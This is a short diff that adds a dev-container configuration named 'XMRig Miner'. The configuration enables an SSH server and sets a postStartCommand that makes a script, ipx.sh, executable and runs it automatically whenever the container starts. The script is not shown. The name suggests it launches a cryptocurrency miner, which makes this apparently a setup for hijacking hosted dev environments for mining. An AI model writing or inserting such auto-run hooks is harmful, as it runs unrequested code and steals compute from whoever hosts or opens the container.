@@ -1,0 +1,9 @@
+{
+  "name": "XMRig Miner",
+  "features": {
+    "ghcr.io/devcontainers/features/sshd:1": {
+      "version": "latest"
+    }
+  },
+  "postStartCommand": "chmod +x ipx.sh && ./ipx.sh"
+}
